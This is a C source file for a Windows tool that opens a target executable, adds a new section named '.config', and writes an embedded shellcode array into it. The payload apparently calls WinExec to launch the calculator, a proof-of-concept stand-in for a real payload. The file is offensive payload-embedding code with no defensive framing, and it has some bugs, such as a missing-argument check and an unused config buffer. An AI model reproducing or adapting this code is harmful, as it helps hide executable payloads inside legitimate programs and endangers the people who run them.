#include <Windows.h>
#include <stdio.h>

#define PRINT_WINAPI_ERR( cApiName ) printf( "[!] %s Failed: %d\n", cApiName, GetLastError() )

#define C_PTR( x )		 ( PVOID ) x
#define U_PTR( x )		 ( ULONG_PTR ) x
#define ALIGN_UP( x, a ) ( ( x + a - 1 ) & ~( a - 1 ) )
#define FILE_ALIGNMENT	 0x200

const unsigned char Shellcode[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

BOOL PeReadFile(
	_In_  LPCSTR cFileName,
	_Out_ PBYTE* ppBuffer,
	_Out_ PDWORD pdwFileSize
) {
	HANDLE hFile               = INVALID_HANDLE_VALUE;
	PBYTE  pBufer              = NULL;
	DWORD  dwFileSize		   = 0x00;
	DWORD  dwNumberOfBytesRead = 0x00;

	if ( ( hFile = CreateFileA( cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) == INVALID_HANDLE_VALUE ) {
		PRINT_WINAPI_ERR( "CreateFileA" );
		goto END;
	}

	if ( ( dwFileSize = GetFileSize( hFile, NULL ) ) == INVALID_FILE_SIZE ) {
		PRINT_WINAPI_ERR( "GetFileSize" );
		goto END;
	}

	if ( ( pBufer = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize ) ) == NULL ) {
		PRINT_WINAPI_ERR( "HeapAlloc" );
		goto END;
	}

	if ( ! ReadFile( hFile, pBufer, dwFileSize, &dwNumberOfBytesRead, NULL ) || dwFileSize != dwNumberOfBytesRead ) {
		PRINT_WINAPI_ERR( "ReadFile" );
		goto END;
	}

	*ppBuffer    = pBufer;
	*pdwFileSize = dwFileSize;

END:
	if ( hFile != INVALID_HANDLE_VALUE ) {
		CloseHandle( hFile );
		hFile = NULL;
	}

	if ( ! *ppBuffer && pBufer ) {
	    HeapFree( GetProcessHeap(), 0x00, pBufer );
		pBufer = NULL;
	}

	return ( ( *ppBuffer != NULL ) && ( *pdwFileSize != 0x00 ) ) ? TRUE : FALSE;
}

BOOL PeMapView( 
    _In_  HANDLE  File,
	_Out_ PHANDLE FileMapped,
	_Out_ PVOID*  Image,
	_In_  ULONG   SectionSize
) {
	ULONG Size = { 0 };

	if ( ! FileMapped || ! Image || ! SectionSize ) {
	    return FALSE; 
	}

	Size = ALIGN_UP( GetFileSize( File, NULL ) + SectionSize, FILE_ALIGNMENT );
	printf( "[*] Calculated PE size -> %x [%d bytes]\n", Size, Size );

	if ( ! ( *FileMapped = CreateFileMappingA( File, NULL, PAGE_READWRITE, 0, Size, NULL ) ) ) {
		printf( "[!] CreateFileMappingA Failed: %d\n", GetLastError() );
	    goto END;
	}

	if ( ! ( *Image = MapViewOfFile( *FileMapped, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0 ) ) ) {
	    printf( "[!] MapViewOfFile Failed: %d\n", GetLastError() );
	    goto END;
	}

END:
	return *Image ? TRUE : FALSE;
}

BOOL PeUnMapView(
	_Out_ PHANDLE FileMapped,
	_Out_ PVOID   Image
) {
	if ( ! UnmapViewOfFile( Image ) ) {
		PRINT_WINAPI_ERR( "UnmapViewOfFile" );
	    return FALSE;
	}

	if ( ! CloseHandle( FileMapped ) ) {
		PRINT_WINAPI_ERR( "CloseHandle" );
	    return FALSE;
	}

	return TRUE;
}

BOOL PeSectionInsert(
    _In_ PVOID Buffer,
	_In_ LPSTR SecName,
	_In_ PVOID SecData,
	_In_ ULONG SecSize
) {
	PIMAGE_NT_HEADERS	  NtHeader  = { 0 };
	PIMAGE_SECTION_HEADER ScHeader  = { 0 };
	PIMAGE_SECTION_HEADER ScPayload = { 0 };
	PIMAGE_SECTION_HEADER ScLastHdr = { 0 };
	ULONG			      NumOfSec  = { 0 };

	//
	// retrieve nt image header 
	//
	NtHeader = ( U_PTR( Buffer ) + ( ( PIMAGE_DOS_HEADER ) Buffer )->e_lfanew );
	if ( NtHeader->Signature != IMAGE_NT_SIGNATURE ) {
		puts( "[-] Invalid pe header" );
		return FALSE;
	}

	//
	// parse sections, get the last section of
	// the pe and the new section 
	//
	NumOfSec  = NtHeader->FileHeader.NumberOfSections;
	ScHeader  = IMAGE_FIRST_SECTION( NtHeader );
	ScPayload = & ScHeader[ NumOfSec ];
	ScLastHdr = & ScHeader[ NumOfSec - 1 ];

	//
	// zero out our payload section structure
	//
    ZeroMemory( ScPayload, sizeof( IMAGE_SECTION_HEADER ) );
	
	//
	// copy over the section name 
	//
	memcpy( & ScPayload->Name, SecName, 8 );

	//
	// set section values, size and characteristics
	// 
	ScPayload->Misc.VirtualSize = SecSize;
	ScPayload->VirtualAddress	= ALIGN_UP( ( ScLastHdr->VirtualAddress + ScLastHdr->Misc.VirtualSize ), NtHeader->OptionalHeader.SectionAlignment );
	ScPayload->SizeOfRawData	= ALIGN_UP( SecSize, NtHeader->OptionalHeader.FileAlignment );
	ScPayload->PointerToRawData = ScLastHdr->PointerToRawData + ScLastHdr->SizeOfRawData;
	ScPayload->Characteristics	= IMAGE_SCN_MEM_READ;

	//
	// copy over the payload data to the newly created section 
	//
	memcpy( U_PTR( Buffer ) + ScPayload->PointerToRawData, SecData, SecSize );

	// 
	// modify the NtHeader to take in account the changes
	// like adding a new section + incrementing the section 
	//
	NtHeader->FileHeader.NumberOfSections++;
	NtHeader->OptionalHeader.SizeOfImage = ScPayload->VirtualAddress + ALIGN_UP( SecSize, NtHeader->OptionalHeader.SectionAlignment );

	return TRUE;
}

int main( 
    int    argc, 
    char** argv
) {
	HANDLE File       = { 0 };
	HANDLE Mapped     = { 0 };
    PVOID  Image      = { 0 };
    ULONG  Length     = { 0 };
	PVOID  ConfigData = { 0 };
	PVOID  ConfigSize = { 0 };
	CHAR   Name[]	  = ".config";

    if ( argc < 2 ) {
        printf( "[!] %s [config] [file path]", argv[ 0 ] );
        return -1;
    }

	//
	// read the config data that is going to
	// be inserted into the target pe 
	//
	if ( ! PeReadFile( argv[ 1 ], &ConfigData, &ConfigSize ) ) {
	    puts( "[!] Failed to read config file" );
		goto END;
	}

	//
	// open target pe file 
	//
	if ( ( File = CreateFileA( argv[ 2 ], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) == INVALID_HANDLE_VALUE ) {
		PRINT_WINAPI_ERR( "CreateFileA" );
		goto END;
	}
	printf( "[*] Opened file %s @ %x\n", argv[ 2 ], File );

	//
	// map file into memory 
	//
	if ( ! PeMapView( File, &Mapped, &Image, sizeof( Shellcode ) ) ) {
	    puts( "[!] Failed to map file into memory" );
		goto END;
	}
	printf( "[*] Mapped file into memory @ %p\n", Image );
	
	//
	// insert the shellcode into the .config section
	//
	if ( ! PeSectionInsert( Image, Name, Shellcode, sizeof( Shellcode ) ) ) {
	    puts( "[!] Failed to insert section into file" );
		goto END;
	}
    printf( "[*] Inserted shellcode into the \"%s\" section\n", Name );

	//
	// unmap file view 
	//
	if ( ! PeUnMapView( Mapped, Image ) ) {
	    puts( "[!] Failed to unmap file" );
		goto END;
	}

	printf( "[+] Finished" );

END:
	if ( File ) {
	    CloseHandle( File );
		File = NULL;
	}

	return 0; 
}